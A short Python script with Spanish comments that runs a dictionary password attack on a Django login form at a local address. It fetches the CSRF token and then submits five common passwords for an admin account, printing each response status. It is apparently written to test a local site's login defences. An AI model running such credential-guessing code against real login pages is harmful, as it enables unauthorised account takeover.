import requests

url = "http://127.0.0.1:8000/login/" # Cambia por tu URL local
usuario = "admin@dominio.com"
lista_claves = ["123456", "password", "admin123", "qwerty", "segura123"]

# Simulamos el envío del formulario
with requests.Session() as session:
    # Primero obtenemos el token CSRF (Django lo exige)
    response = session.get(url)
    csrf_token = session.cookies['csrftoken']

    for clave in lista_claves:
        payload = {
            'username': usuario,
            'password': clave,
            'csrfmiddlewaretoken': csrf_token
        }
        r = session.post(url, data=payload)
        print(f"Probando: {clave} -> Status: {r.status_code}")